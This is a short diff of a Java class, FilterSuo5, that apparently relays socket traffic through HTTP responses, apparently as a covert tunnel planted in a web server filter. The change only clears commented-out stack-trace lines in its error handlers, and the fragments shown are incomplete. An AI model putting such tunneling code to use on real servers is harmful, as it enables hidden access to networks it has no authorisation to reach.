@@ -468,7 +468,7 @@ public class FilterSuo5 implements InvocationHandler, Runnable, HostnameVerifier
                 invokeMethod(resp.getClass(), resp, "flushBuffer", new Class[]{}, new Object[]{});
             } catch (Exception e) {
 //                    System.out.printf("connect error %s\n", e);
-//                    e.printStackTrace();
+//                    
                 this.remove(clientId);
                 respOutStream.write(marshal(newStatus((byte) 0x01)));
                 respOutStream.flush();
@@ -480,7 +480,7 @@ public class FilterSuo5 implements InvocationHandler, Runnable, HostnameVerifier
             readSocket(readFrom, respOutStream, !needRedirect);
         } catch (Exception e) {
 //                System.out.println("socket error " + e.toString());
-//                e.printStackTrace();
+//                
         } finally {
             if (sc != null) {
                 sc.close();
@@ -498,7 +498,7 @@ public class FilterSuo5 implements InvocationHandler, Runnable, HostnameVerifier
             readSocket(gInStream, gOutStream, true);
         } catch (Exception e) {
 //                System.out.printf("read socket error, %s\n", e);
-//                e.printStackTrace();
+//                
         }
     }
 
@@ -524,7 +524,7 @@ public class FilterSuo5 implements InvocationHandler, Runnable, HostnameVerifier
             }
         } catch (Exception e) {
 //                System.out.printf("read socket error, %s\n", e);
-//                e.printStackTrace();
+//                
         }
         return addrs;
     }
